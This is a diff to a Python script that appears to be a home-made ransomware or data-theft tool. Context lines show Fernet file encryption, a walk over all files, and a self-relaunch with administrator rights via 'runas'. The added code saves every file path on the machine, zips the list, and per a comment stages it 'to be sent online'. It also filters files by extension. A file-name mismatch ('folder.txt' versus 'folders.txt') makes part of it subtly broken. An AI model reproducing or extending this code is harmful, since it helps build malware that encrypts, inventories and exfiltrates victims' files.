@@ -14,7 +14,6 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-
 def encrypt_file(file_path: str, F_key: Fernet) -> None:
     try_count = 0
     # READ FILE
@@ -85,13 +84,52 @@ def all_files(start_path: str) -> []:
     return files_in_directory
 
 
-def compress_files(path: str) -> None:
-    with open('.\\Compress.zip', 'w') as compress:
-        with open(path,'r') as read:
-            for e in read:
-                compress.write(e)
-        read.close()
+def save_file(path:str,files:[[str]])->None:
+    '''
+    :param path: Where the file should be save
+    :param files: Data of the file
+    :return: None
+    '''
+    with open(path,'w', encoding="utf-8") as save:
+        for e in files:
+            for k in e:
+                save.write(f'{k}\n')
+        save.close()
+
+def save_specific_files(path:str,files:[str]) -> None:
+    with open(path,'w') as save:
+        for e in files:
+            save.write(f'{e}\n')
+    save.close()
+def compress_files(path: str, name_to_the_compress_file: str) -> None:
+    '''
+    :param path: path where the file to compress is
+    :param name_to_the_compress_file: The name you want compressed file should have. Don't forget the extention like .txt
+    :return: None
+    '''
+    # create a file with all the path of the computer
+    # Compress the file with all the path to prepare it to be sent online
+    with zipfile.ZipFile('Compress.zip', 'w', compression=zipfile.ZIP_DEFLATED,compresslevel=9) as compress:
+        compress.write(path,arcname=name_to_the_compress_file)
     compress.close()
+
+def find_file_by_type(data_path: str, file_type: str)->[str]:
+    '''
+    :param data_path: The path where the file with the data you want to look is
+    :param file_type: the type of the file you want to find like .txt, .docx, .exe...
+    :return: array of string with all the file absolute path
+    '''
+    regex = f'^.*(?:{file_type})' # will look at the extention and take everything before
+    reg:[str] = []
+    with open(data_path,'r') as data:
+        for e in data:
+            if re.match(regex,e):
+                reg.append(e.replace('\n',''))
+    data.close()
+    return reg
+
+
+
 
 
 def main():
@@ -116,11 +154,11 @@ def main():
     else:
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    with open('.\\files.txt','w', encoding="utf-8") as save:
-        for e in files:
-            for k in e:
-                save.write(f'{k}\n')
-        save.close()
+    save_file('.\\folders.txt',files)
+    compress_files('.\\folders.txt', 'test.txt')
+    save_specific_files('.\\Searched.txt',find_file_by_type('.\\folder.txt','.txt'))
+
+
     input('its over')
 
 
